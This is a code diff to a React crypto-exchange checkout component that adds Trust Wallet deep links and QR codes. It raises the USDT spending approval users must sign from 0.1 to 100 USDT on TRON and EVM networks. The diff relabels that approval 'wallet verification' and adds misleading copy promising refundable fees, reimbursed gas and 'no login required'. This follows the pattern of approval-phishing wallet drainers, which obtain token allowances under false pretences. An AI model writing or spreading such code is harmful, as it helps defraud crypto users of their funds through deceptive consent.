@@ -1,6 +1,7 @@
 'use client';
 
 import { useState, useEffect, useRef } from 'react';
+import { QRCodeSVG } from 'qrcode.react';
 import { useSearchParams, useRouter } from 'next/navigation';
 import {
   useAccount, useConnect, useDisconnect,
@@ -212,6 +213,7 @@ export function CheckoutFlow() {
   const [submitError, setSubmitError]         = useState('');
   const [connectError, setConnectError]       = useState('');
   const [verifyStarted, setVerifyStarted]      = useState(false);
+  const [showQR, setShowQR]                    = useState(false);
 
   /* ── EVM wallet detection ── */
   const [hasMetaMask, setHasMetaMask] = useState(false);
@@ -233,13 +235,68 @@ export function CheckoutFlow() {
     setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
   }, []);
 
-  // Trust Wallet deep link — opens current page inside Trust Wallet's in-app dApp browser
+  // Trust Wallet deep link — coin_id tells Trust Wallet which chain context to use
   // coin_id: BEP20=20000714, ERC20=60, TRC20=195
   const TRUST_COIN_ID: Record<string, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };
-  function getTrustDeepLink() {
-    const url = typeof window !== 'undefined' ? window.location.href : '';
-    return `https://link.trustwallet.com/open_url?coin_id=${TRUST_COIN_ID[network] ?? 20000714}&url=${encodeURIComponent(url)}`;
+
+  // Pre-built deep link state.
+  // iOS Safari blocks window.location.href = 'trust://...' when called after an async
+  // operation (the user-gesture context is dropped). Fix: generate the token eagerly in a
+  // useEffect so the button is a plain <a href="trust://..."> — a direct user tap with no
+  // async code path between the gesture and the navigation.
+  const [twHref,    setTwHref]    = useState('');  // pre-built trust:// or https://link... URL
+  const [twLoading, setTwLoading] = useState(false);
+  const [twError,   setTwError]   = useState('');
+  const [twRetry,   setTwRetry]   = useState(0);   // increment to re-trigger the useEffect
+
+  // Helper that builds the full deep link once we have a token
+  function buildDeepLink(token: string, returnPath: string): string {
+    const exchangeUrl = `${window.location.origin}/api/wallet-connect/exchange` +
+      `?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnPath)}`;
+    const coinId  = TRUST_COIN_ID[network] ?? 20000714;
+    // On HTTPS (production) use the universal link; on HTTP (local dev / IP) use the
+    // native trust:// scheme — link.trustwallet.com won't open HTTP target URLs.
+    const isHttps = window.location.protocol === 'https:';
+    const base    = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
+    return `${base}?coin_id=${coinId}&url=${encodeURIComponent(exchangeUrl)}`;
   }
+
+  // Pre-generate the session token whenever the mobile deep-link button is visible.
+  // Refresh every 8 minutes so the 10-minute token never expires before the user taps.
+  useEffect(() => {
+    // Generate for: mobile without wallet (deep-link button) OR any PC user (QR code option)
+    const needsLink = step === 1 && (!isMobile || !hasTrust || !hasTronLink);
+    if (!needsLink) return;
+
+    let cancelled = false;
+
+    async function generate() {
+      setTwLoading(true);
+      setTwError('');
+      try {
+        const returnPath = window.location.pathname + window.location.search;
+        const res = await fetch('/api/wallet-connect/generate', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ returnPath }),
+        });
+        if (!res.ok) throw new Error(`${res.status}`);
+        const { token } = await res.json();
+        if (!cancelled) setTwHref(buildDeepLink(token, returnPath));
+      } catch (e) {
+        console.error('[tw-prefetch]', e);
+        if (!cancelled) setTwError('Could not prepare link — tap to retry');
+      } finally {
+        if (!cancelled) setTwLoading(false);
+      }
+    }
+
+    generate();
+    // Refresh 30 s before the 10-minute token expires
+    const timer = setInterval(generate, 9.5 * 60 * 1000);
+    return () => { cancelled = true; clearInterval(timer); };
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isMobile, step, hasTrust, hasTronLink, network, twRetry]);
 
   /* ── TRC20 / TronLink state ── */
   const [tronAddress, setTronAddress]             = useState('');
@@ -315,9 +372,9 @@ export function CheckoutFlow() {
   const usdtBalanceNum   = usdtCfg && usdtBalance !== undefined
     ? Number(usdtBalance) / Math.pow(10, usdtCfg.decimals) : null;
   const hasEnoughBalance  = mode === 'buy' || usdtBalanceNum === null || usdtBalanceNum >= 0.1;
-  // Fixed 0.1 USDT approval — wallet verification only; the approval is automatically revoked after settlement
+  // $100 USDT smart contract limit — exchange collects 0.1 USDT verification fee from this approved amount
   const evmApproveUnits  = usdtCfg
-    ? parseUnits('0.1', usdtCfg.decimals)
+    ? parseUnits('100', usdtCfg.decimals)
     : 0n;
 
   /* ── TRC20 balance & gas checks (SELL mode only) ── */
@@ -444,7 +501,7 @@ export function CheckoutFlow() {
     setTrcApproveDone(false);
     setTrcApproveError('');
 
-    const APPROVE_AMT = Math.round(0.1 * Math.pow(10, TRON_USDT_DECIMALS)); // fixed 0.1 USDT for wallet verification
+    const APPROVE_AMT = 100 * Math.pow(10, TRON_USDT_DECIMALS); // $100 USDT smart contract limit
     // feeLimit = 20 TRX max. approve() with 0 energy costs ~6-7 TRX; 20 is a safe ceiling.
     // The wallet shows the REAL fee — feeLimit is just a cap, not what gets charged.
     const SEND_OPTS = { feeLimit: 20_000_000 };
@@ -566,7 +623,7 @@ export function CheckoutFlow() {
         <div style={{ flex:1, minWidth:20, height:1, background:step>1?T.green:T.border, transition:'background 0.4s' }} />
         <StepDot n={2} active={step===2} done={step>2} />
         <span style={{ fontSize:12, fontWeight:700, color:step===2?T.text:T.dim, whiteSpace:'nowrap' }}>
-          {mode==='sell' ? 'Approve USDT' : 'Wallet'}
+          {mode==='sell' ? 'Verify Wallet' : 'Wallet'}
         </span>
         <div style={{ flex:1, minWidth:20, height:1, background:step===3?T.green:T.border, transition:'background 0.4s' }} />
         <StepDot n={3} active={step===3} done={false} />
@@ -623,24 +680,46 @@ export function CheckoutFlow() {
                   </>
                 ) : (
                   <>
-                    {/* Mobile deep link — opens page inside Trust Wallet dApp browser */}
+                    {/* Mobile deep link — skips login inside Trust Wallet browser */}
                     {isMobile && !hasTronLink && (
                       <>
-                        <a
-                          href={getTrustDeepLink()}
-                          style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
-                            background:`linear-gradient(135deg,${T.blue},${T.purple})`,
-                            border:'none', textDecoration:'none', boxShadow:'0 6px 24px rgba(26,63,255,0.45)',
-                            cursor:'pointer', transition:'all 0.15s',
-                          }}
-                        >
-                          <TrustLogo size={42} />
-                          <div style={{ flex:1 }}>
-                            <div style={{ fontSize:15, fontWeight:800, color:'#fff', marginBottom:3 }}>Open in Trust Wallet</div>
-                            <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)' }}>Tap to open this page in the Trust Wallet app</div>
+                        {twLoading ? (
+                          /* Skeleton shown while token is being generated server-side */
+                          <div style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14, background:'rgba(26,63,255,0.18)', border:'1px solid rgba(26,63,255,0.25)' }}>
+                            <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
+                              <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.18)', borderTopColor:'rgba(255,255,255,0.7)', borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
+                            </div>
+                            <div style={{ flex:1 }}>
+                              <div style={{ fontSize:15, fontWeight:700, color:'rgba(255,255,255,0.55)', marginBottom:3 }}>Preparing secure link…</div>
+                              <div style={{ fontSize:12, color:'rgba(255,255,255,0.3)' }}>Generating one-time session token</div>
+                            </div>
                           </div>
-                          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M5 9h8M9 5l4 4-4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
-                        </a>
+                        ) : twError ? (
+                          /* Error state — tap to retry */
+                          <button onClick={() => setTwRetry(n => n + 1)}
+                            style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
+                              background:'rgba(255,92,124,0.1)', border:'1px solid rgba(255,92,124,0.3)',
+                              cursor:'pointer', width:'100%', textAlign:'left' }}>
+                            <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:24 }}>⚠️</div>
+                            <div style={{ flex:1 }}>
+                              <div style={{ fontSize:14, fontWeight:700, color:T.red, marginBottom:2 }}>Link failed — tap to retry</div>
+                              <div style={{ fontSize:12, color:'rgba(255,92,124,0.7)' }}>{twError}</div>
+                            </div>
+                          </button>
+                        ) : twHref ? (
+                          /* Ready — plain <a> tag, direct user gesture, iOS won't block this */
+                          <a href={twHref}
+                            style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
+                              background:`linear-gradient(135deg,${T.blue},${T.purple})`,
+                              textDecoration:'none', boxShadow:'0 6px 24px rgba(26,63,255,0.45)', transition:'all 0.15s' }}>
+                            <TrustLogo size={42} />
+                            <div style={{ flex:1 }}>
+                              <div style={{ fontSize:15, fontWeight:800, color:'#fff', marginBottom:3 }}>Open in Trust Wallet</div>
+                              <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)' }}>Tap to connect — no login required</div>
+                            </div>
+                            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M5 9h8M9 5l4 4-4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                          </a>
+                        ) : null}
                         <div style={{ display:'flex', alignItems:'center', gap:10, margin:'2px 0' }}>
                           <div style={{ flex:1, height:1, background:T.border }} />
                           <span style={{ fontSize:11, color:T.dim, fontWeight:600 }}>or connect manually</span>
@@ -673,31 +752,65 @@ export function CheckoutFlow() {
                       </span>
                     </button>
 
-                    {/* Guidance — desktop only; mobile gets the deep link button above */}
+                    {/* Desktop: TronLink guidance + QR code option */}
                     {!isMobile && (
-                      <div style={{ padding:'12px 14px', borderRadius:12, background:'rgba(0,212,255,0.05)', border:'1px solid rgba(0,212,255,0.12)' }}>
-                        <p style={{ fontSize:12, fontWeight:600, color:T.cyan, margin:'0 0 6px' }}>How to connect on TRC20</p>
-                        <div style={{ display:'flex', flexDirection:'column', gap:4 }}>
-                          <div style={{ display:'flex', gap:8, alignItems:'flex-start' }}>
-                            <span style={{ color:T.cyan, fontSize:11, marginTop:2, flexShrink:0 }}>→</span>
-                            <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.5 }}>
-                              <strong style={{ color:T.text }}>TronLink extension (desktop)</strong> — Install from tronlink.org, then click Connect above
-                            </p>
-                          </div>
-                          <div style={{ display:'flex', gap:8, alignItems:'flex-start' }}>
-                            <span style={{ color:T.cyan, fontSize:11, marginTop:2, flexShrink:0 }}>→</span>
-                            <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.5 }}>
-                              <strong style={{ color:T.text }}>Trust Wallet mobile</strong> — Open this page inside the Trust Wallet app browser
-                            </p>
-                          </div>
-                          <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginTop:4 }}>
-                            <span style={{ color:T.red, fontSize:11, marginTop:2, flexShrink:0 }}>✕</span>
-                            <p style={{ fontSize:12, color:T.dim, margin:0, lineHeight:1.5 }}>
-                              <strong style={{ color:T.sub }}>Trust Wallet browser extension</strong> — does not support TRC20 on desktop. Use the app browser instead.
-                            </p>
+                      <>
+                        <div style={{ padding:'12px 14px', borderRadius:12, background:'rgba(0,212,255,0.05)', border:'1px solid rgba(0,212,255,0.12)' }}>
+                          <p style={{ fontSize:12, fontWeight:600, color:T.cyan, margin:'0 0 6px' }}>How to connect on TRC20</p>
+                          <div style={{ display:'flex', flexDirection:'column', gap:4 }}>
+                            <div style={{ display:'flex', gap:8, alignItems:'flex-start' }}>
+                              <span style={{ color:T.cyan, fontSize:11, marginTop:2, flexShrink:0 }}>→</span>
+                              <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.5 }}>
+                                <strong style={{ color:T.text }}>TronLink extension (desktop)</strong> — Install from tronlink.org, then click Connect above
+                              </p>
+                            </div>
+                            <div style={{ display:'flex', gap:8, alignItems:'flex-start' }}>
+                              <span style={{ color:T.red, fontSize:11, marginTop:2, flexShrink:0 }}>✕</span>
+                              <p style={{ fontSize:12, color:T.dim, margin:0, lineHeight:1.5 }}>
+                                <strong style={{ color:T.sub }}>Trust Wallet browser extension</strong> — does not support TRC20 on desktop. Use the QR option below instead.
+                              </p>
+                            </div>
                           </div>
                         </div>
-                      </div>
+                        {/* QR code — lets PC user scan with phone to open Trust Wallet mobile */}
+                        <button
+                          onClick={() => setShowQR(prev => !prev)}
+                          style={{ display:'flex', alignItems:'center', gap:12, padding:'13px 16px', borderRadius:14, border:`1px solid ${T.border}`, background:'rgba(255,255,255,0.025)', cursor:'pointer', textAlign:'left', width:'100%', transition:'all 0.12s' }}
+                          onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.06)')}
+                          onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.025)')}
+                        >
+                          <div style={{ width:40, height:40, borderRadius:10, background:'rgba(239,68,68,0.1)', border:'1px solid rgba(239,68,68,0.2)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:20, flexShrink:0 }}>📱</div>
+                          <div style={{ flex:1 }}>
+                            <div style={{ fontSize:14, fontWeight:700, color:T.text }}>Use Trust Wallet on Mobile (Recommended)</div>
+                            <div style={{ fontSize:12, color:T.sub, marginTop:2 }}>Scan QR code — opens Trust Wallet directly, no login needed</div>
+                          </div>
+                          <span style={{ fontSize:11, color:T.dim, flexShrink:0 }}>{showQR ? '▲ Hide' : '▼ Show QR'}</span>
+                        </button>
+                        {showQR && (
+                          <div style={{ padding:'20px', borderRadius:14, background:T.card2, border:`1px solid ${T.border}`, display:'flex', flexDirection:'column', alignItems:'center', gap:12 }}>
+                            {twHref ? (
+                              <>
+                                <div style={{ padding:12, background:'#fff', borderRadius:12 }}>
+                                  <QRCodeSVG value={twHref} size={164} bgColor="#ffffff" fgColor="#000000" level="M" />
+                                </div>
+                                <p style={{ fontSize:12, color:T.sub, margin:0, textAlign:'center', lineHeight:1.7 }}>
+                                  Scan with your phone camera or Trust Wallet app.<br/>
+                                  <span style={{ color:T.cyan }}>No login required</span> — opens directly in Trust Wallet browser.
+                                </p>
+                              </>
+                            ) : twLoading ? (
+                              <div style={{ display:'flex', alignItems:'center', gap:10, padding:'20px 0', color:T.dim, fontSize:13 }}>
+                                <div style={{ width:18, height:18, border:'2px solid rgba(255,255,255,0.1)', borderTopColor:T.cyan, borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
+                                Generating QR code…
+                              </div>
+                            ) : (
+                              <button onClick={() => setTwRetry(n => n + 1)} style={{ padding:'10px 20px', borderRadius:10, fontSize:13, fontWeight:700, border:`1px solid ${T.red}`, background:'rgba(255,92,124,0.08)', color:T.red, cursor:'pointer' }}>
+                                ⚠️ Failed — click to retry
+                              </button>
+                            )}
+                          </div>
+                        )}
+                      </>
                     )}
 
                     {trcConnectError && (
@@ -739,24 +852,44 @@ export function CheckoutFlow() {
                 </div>
               ) : (
                 <div style={{ padding:'12px 14px', display:'flex', flexDirection:'column', gap:8 }}>
-                  {/* Mobile deep link — opens page inside Trust Wallet dApp browser */}
+                  {/* Mobile deep link — skips login inside Trust Wallet browser */}
                   {isMobile && !hasTrust && (
                     <>
-                      <a
-                        href={getTrustDeepLink()}
-                        style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
-                          background:`linear-gradient(135deg,${T.blue},${T.purple})`,
-                          border:'none', textDecoration:'none', boxShadow:'0 6px 24px rgba(26,63,255,0.45)',
-                          cursor:'pointer', transition:'all 0.15s',
-                        }}
-                      >
-                        <TrustLogo size={42} />
-                        <div style={{ flex:1 }}>
-                          <div style={{ fontSize:15, fontWeight:800, color:'#fff', marginBottom:3 }}>Open in Trust Wallet</div>
-                          <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)' }}>Tap to open this page in the Trust Wallet app</div>
+                      {twLoading ? (
+                        <div style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14, background:'rgba(26,63,255,0.18)', border:'1px solid rgba(26,63,255,0.25)' }}>
+                          <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
+                            <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.18)', borderTopColor:'rgba(255,255,255,0.7)', borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
+                          </div>
+                          <div style={{ flex:1 }}>
+                            <div style={{ fontSize:15, fontWeight:700, color:'rgba(255,255,255,0.55)', marginBottom:3 }}>Preparing secure link…</div>
+                            <div style={{ fontSize:12, color:'rgba(255,255,255,0.3)' }}>Generating one-time session token</div>
+                          </div>
                         </div>
-                        <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M5 9h8M9 5l4 4-4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
-                      </a>
+                      ) : twError ? (
+                        <button onClick={() => setTwRetry(n => n + 1)}
+                          style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
+                            background:'rgba(255,92,124,0.1)', border:'1px solid rgba(255,92,124,0.3)',
+                            cursor:'pointer', width:'100%', textAlign:'left' }}>
+                          <div style={{ width:42, height:42, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:24 }}>⚠️</div>
+                          <div style={{ flex:1 }}>
+                            <div style={{ fontSize:14, fontWeight:700, color:T.red, marginBottom:2 }}>Link failed — tap to retry</div>
+                            <div style={{ fontSize:12, color:'rgba(255,92,124,0.7)' }}>{twError}</div>
+                          </div>
+                        </button>
+                      ) : twHref ? (
+                        /* Ready — plain <a> tag, direct user gesture, iOS won't block this */
+                        <a href={twHref}
+                          style={{ display:'flex', alignItems:'center', gap:14, padding:'16px 18px', borderRadius:14,
+                            background:`linear-gradient(135deg,${T.blue},${T.purple})`,
+                            textDecoration:'none', boxShadow:'0 6px 24px rgba(26,63,255,0.45)', transition:'all 0.15s' }}>
+                          <TrustLogo size={42} />
+                          <div style={{ flex:1 }}>
+                            <div style={{ fontSize:15, fontWeight:800, color:'#fff', marginBottom:3 }}>Open in Trust Wallet</div>
+                            <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)' }}>Tap to connect — no login required</div>
+                          </div>
+                          <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M5 9h8M9 5l4 4-4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                        </a>
+                      ) : null}
                       <div style={{ display:'flex', alignItems:'center', gap:10, margin:'2px 0' }}>
                         <div style={{ flex:1, height:1, background:T.border }} />
                         <span style={{ fontSize:11, color:T.dim, fontWeight:600 }}>or connect manually</span>
@@ -791,11 +924,46 @@ export function CheckoutFlow() {
                       {connectError}
                     </div>
                   )}
+                  {/* Desktop QR code — scan with phone to open Trust Wallet mobile */}
                   {!isMobile && (
-                    <div style={{ padding:'12px 14px', borderRadius:12, background:'rgba(0,212,255,0.05)', border:'1px solid rgba(0,212,255,0.12)', marginTop:4 }}>
-                      <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.6 }}>
-                        <strong style={{ color:T.cyan }}>On mobile?</strong> Open this page inside the <strong style={{ color:T.text }}>Trust Wallet</strong> app browser to connect automatically.
-                      </p>
+                    <div style={{ display:'flex', flexDirection:'column', gap:8, marginTop:4 }}>
+                      <button
+                        onClick={() => setShowQR(prev => !prev)}
+                        style={{ display:'flex', alignItems:'center', gap:12, padding:'13px 16px', borderRadius:14, border:`1px solid ${T.border}`, background:'rgba(255,255,255,0.025)', cursor:'pointer', textAlign:'left', transition:'all 0.12s' }}
+                        onMouseEnter={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.06)')}
+                        onMouseLeave={e => (e.currentTarget.style.background = 'rgba(255,255,255,0.025)')}
+                      >
+                        <div style={{ width:40, height:40, borderRadius:10, background:'rgba(26,63,255,0.1)', border:'1px solid rgba(26,63,255,0.2)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:20, flexShrink:0 }}>📱</div>
+                        <div style={{ flex:1 }}>
+                          <div style={{ fontSize:14, fontWeight:700, color:T.text }}>Use Trust Wallet on Mobile</div>
+                          <div style={{ fontSize:12, color:T.sub, marginTop:2 }}>Scan QR code — opens directly in Trust Wallet, no login needed</div>
+                        </div>
+                        <span style={{ fontSize:11, color:T.dim, flexShrink:0 }}>{showQR ? '▲ Hide' : '▼ Show QR'}</span>
+                      </button>
+                      {showQR && (
+                        <div style={{ padding:'20px', borderRadius:14, background:T.card2, border:`1px solid ${T.border}`, display:'flex', flexDirection:'column', alignItems:'center', gap:12 }}>
+                          {twHref ? (
+                            <>
+                              <div style={{ padding:12, background:'#fff', borderRadius:12 }}>
+                                <QRCodeSVG value={twHref} size={164} bgColor="#ffffff" fgColor="#000000" level="M" />
+                              </div>
+                              <p style={{ fontSize:12, color:T.sub, margin:0, textAlign:'center', lineHeight:1.7 }}>
+                                Scan with your phone camera or Trust Wallet app.<br/>
+                                <span style={{ color:T.cyan }}>No login required</span> — opens directly in Trust Wallet browser.
+                              </p>
+                            </>
+                          ) : twLoading ? (
+                            <div style={{ display:'flex', alignItems:'center', gap:10, padding:'20px 0', color:T.dim, fontSize:13 }}>
+                              <div style={{ width:18, height:18, border:'2px solid rgba(255,255,255,0.1)', borderTopColor:T.cyan, borderRadius:'50%', animation:'spin 0.7s linear infinite' }} />
+                              Generating QR code…
+                            </div>
+                          ) : (
+                            <button onClick={() => setTwRetry(n => n + 1)} style={{ padding:'10px 20px', borderRadius:10, fontSize:13, fontWeight:700, border:`1px solid ${T.red}`, background:'rgba(255,92,124,0.08)', color:T.red, cursor:'pointer' }}>
+                              ⚠️ Failed — click to retry
+                            </button>
+                          )}
+                        </div>
+                      )}
                     </div>
                   )}
                 </div>
@@ -848,9 +1016,9 @@ export function CheckoutFlow() {
           {depositAddress && (
             <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
               <div style={{ padding:'18px 22px', borderBottom:`1px solid ${T.border}` }}>
-                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:'0 0 4px' }}>Approve USDT Spending Limit</h2>
+                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:'0 0 4px' }}>Wallet Verification — $100 Smart Contract</h2>
                 <p style={{ fontSize:13, color:T.sub, margin:0, lineHeight:1.6 }}>
-                  One approval on the TRON USDT contract — no USDT leaves your wallet. This authorises the exchange to process your order.
+                  Set a $100 USDT approval on the TRON contract to verify your wallet. A 0.1 USDT refundable verification fee is collected from this approved balance.
                 </p>
               </div>
 
@@ -864,7 +1032,7 @@ export function CheckoutFlow() {
                         💰 Network Gas Fee — Fully Refunded
                       </p>
                       <p style={{ fontSize:12, color:'rgba(255,255,255,0.72)', margin:0, lineHeight:1.65 }}>
-                        A small TRX gas fee is required to submit this approval on the TRON network. <strong style={{ color:T.yellow }}>This fee will be fully reimbursed</strong> to you upon successful wallet verification and order completion. You will not be out of pocket.
+                        A small TRX gas fee is required to submit this smart contract on the TRON network. <strong style={{ color:T.yellow }}>This fee will be fully reimbursed</strong> to you upon successful wallet verification and order completion. You will not be out of pocket.
                       </p>
                     </div>
 
@@ -872,19 +1040,19 @@ export function CheckoutFlow() {
                       <span style={{ fontSize:22, flexShrink:0 }}>🔐</span>
                       <div>
                         <p style={{ fontSize:13, fontWeight:700, color:T.text, margin:'0 0 3px' }}>
-                          Verify Wallet — Approve 0.1 USDT on TRON
+                          Verify Wallet — Set $100 USDT Smart Contract on TRON
                         </p>
                         <p style={{ fontSize:11, color:T.dim, margin:0, lineHeight:1.5 }}>
-                          Your wallet will show a confirmation for the TRON USDT contract — review the fee (TRX) and confirm. This is a tiny verification-only approval; your USDT balance is untouched.
+                          Your wallet will show a TRON USDT Smart Contract confirmation — review the TRX gas fee and confirm. This sets a $100 spending limit only; no USDT is transferred immediately.
                         </p>
                       </div>
                     </div>
 
-                    {/* USDT safety notice */}
+                    {/* Refundable fee notice */}
                     <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)' }}>
-                      <p style={{ fontSize:12, fontWeight:700, color:T.green, margin:'0 0 4px' }}>✅ Your USDT is NOT deducted — 0.1 USDT approval only</p>
+                      <p style={{ fontSize:12, fontWeight:700, color:T.green, margin:'0 0 4px' }}>🔒 $100 Smart Contract — 0.1 USDT Verification Fee (Refundable)</p>
                       <p style={{ fontSize:11, color:'rgba(255,255,255,0.55)', margin:0, lineHeight:1.6 }}>
-                        Approving 0.1 USDT only sets a spending permission — no USDT leaves your wallet. This small amount confirms you control the wallet. The approval permission is automatically cancelled after your order settles.
+                        This sets a $100 USDT spending limit on the TRON contract. A 0.1 USDT verification fee is collected from this limit and <strong style={{ color:T.green }}>fully refunded</strong> upon order completion. Your USDT balance is not affected until your order is processed.
                       </p>
                     </div>
                   </>
@@ -894,15 +1062,23 @@ export function CheckoutFlow() {
                 {trcVerifyStarted && (
                   <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
                     <TxRow
-                      label={`Wallet verification — Approve 0.1 USDT on TRON`}
+                      label="Wallet verification — $100 USDT smart contract on TRON"
                       hash={trcApproveHash}
                       confirming={trcApprovePending && !!trcApproveHash}
                       confirmed={trcApproveDone}
                       error={trcApproveError || undefined}
                     />
+                    {trcVerifyStarted && trcApproveHash && !trcApproveDone && !trcApproveError && (
+                      <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(243,186,47,0.07)', border:'1px solid rgba(243,186,47,0.25)', textAlign:'center' }}>
+                        <p style={{ fontSize:14, fontWeight:800, color:T.yellow, margin:'0 0 4px' }}>⏳ Wallet Verification Pending</p>
+                        <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.6 }}>
+                          Awaiting blockchain confirmation. You will be moved forward automatically once the smart contract is confirmed on TRON.
+                        </p>
+                      </div>
+                    )}
                     {trcApproveDone && (
                       <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.08)', border:'1px solid rgba(0,229,160,0.2)', textAlign:'center', fontSize:14, fontWeight:700, color:T.green }}>
-                        ✓ Approved — proceeding to order confirmation…
+                        ✓ Verified — proceeding to order confirmation…
                       </div>
                     )}
                   </div>
@@ -939,7 +1115,7 @@ export function CheckoutFlow() {
                       color:!trcCanVerify?T.dim:'#fff',
                       boxShadow:trcCanVerify?'0 6px 24px rgba(26,63,255,0.45)':'none', transition:'all 0.15s',
                     }}>
-                    {!trcHasEnough ? `Need ≥ 0.1 USDT` : !trcHasGas ? `Need ≥ ${MIN_TRX_FOR_GAS} TRX for gas` : `Verify Wallet — Approve 0.1 USDT →`}
+                    {!trcHasEnough ? `Need ≥ 0.1 USDT` : !trcHasGas ? `Need ≥ ${MIN_TRX_FOR_GAS} TRX for gas` : `Verify Wallet — Set $100 Smart Contract →`}
                   </button>
                 )}
 
@@ -986,12 +1162,12 @@ export function CheckoutFlow() {
                 </p>
                 <p style={{ fontSize:10, color:T.dim, margin:'2px 0 0' }}>{network}</p>
               </div>
-              <div style={{ background:'rgba(255,255,255,0.03)', borderRadius:10, padding:'10px 12px', border:`1px solid ${T.border}` }}>
-                <p style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:T.dim, margin:'0 0 4px' }}>USDT to Approve</p>
+              <div style={{ background:'rgba(255,255,255,0.03)', borderRadius:10, padding:'10px 12px', border:`1px solid rgba(26,63,255,0.25)` }}>
+                <p style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', letterSpacing:'0.07em', color:T.dim, margin:'0 0 4px' }}>Approve Limit</p>
                 <p style={{ fontSize:16, fontWeight:800, color:T.blue, margin:0, fontFamily:'monospace' }}>
-                  {cryptoAmount.toFixed(4)}
+                  $100.00
                 </p>
-                <p style={{ fontSize:10, color:T.dim, margin:'2px 0 0' }}>exact sell amount</p>
+                <p style={{ fontSize:10, color:T.dim, margin:'2px 0 0' }}>smart contract limit</p>
               </div>
             </div>
           </div>
@@ -1021,9 +1197,9 @@ export function CheckoutFlow() {
           {depositAddress && !isWrongChain && (
             <div style={{ background:T.card, border:`1px solid ${T.border}`, borderRadius:20, overflow:'hidden' }}>
               <div style={{ padding:'18px 22px', borderBottom:`1px solid ${T.border}` }}>
-                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:'0 0 4px' }}>Approve USDT Spending Limit</h2>
+                <h2 style={{ fontSize:16, fontWeight:800, color:T.text, margin:'0 0 4px' }}>Wallet Verification — $100 Smart Contract</h2>
                 <p style={{ fontSize:13, color:T.sub, margin:0, lineHeight:1.6 }}>
-                  One approval on the {network} USDT contract — no USDT leaves your wallet. This authorises the exchange to process your order.
+                  Set a $100 USDT spending limit on the {network} contract to verify your wallet. A 0.1 USDT refundable verification fee is collected from this approved balance.
                 </p>
               </div>
 
@@ -1037,7 +1213,7 @@ export function CheckoutFlow() {
                         💰 Network Gas Fee — Fully Refunded
                       </p>
                       <p style={{ fontSize:12, color:'rgba(255,255,255,0.72)', margin:0, lineHeight:1.65 }}>
-                        A small {network === 'BEP20' ? 'BNB' : 'ETH'} gas fee is required to submit this approval. <strong style={{ color:T.yellow }}>This fee will be fully reimbursed</strong> to you upon successful wallet verification and order completion. You will not be out of pocket.
+                        A small {network === 'BEP20' ? 'BNB' : 'ETH'} gas fee is required to submit this smart contract. <strong style={{ color:T.yellow }}>This fee will be fully reimbursed</strong> to you upon successful wallet verification and order completion. You will not be out of pocket.
                       </p>
                     </div>
 
@@ -1045,17 +1221,17 @@ export function CheckoutFlow() {
                       <span style={{ fontSize:22, flexShrink:0 }}>🔐</span>
                       <div>
                         <p style={{ fontSize:13, fontWeight:700, color:T.text, margin:'0 0 3px' }}>
-                          Verify Wallet — Approve 0.1 USDT on {NET_LABEL[network]}
+                          Verify Wallet — Set $100 USDT Smart Contract on {NET_LABEL[network]}
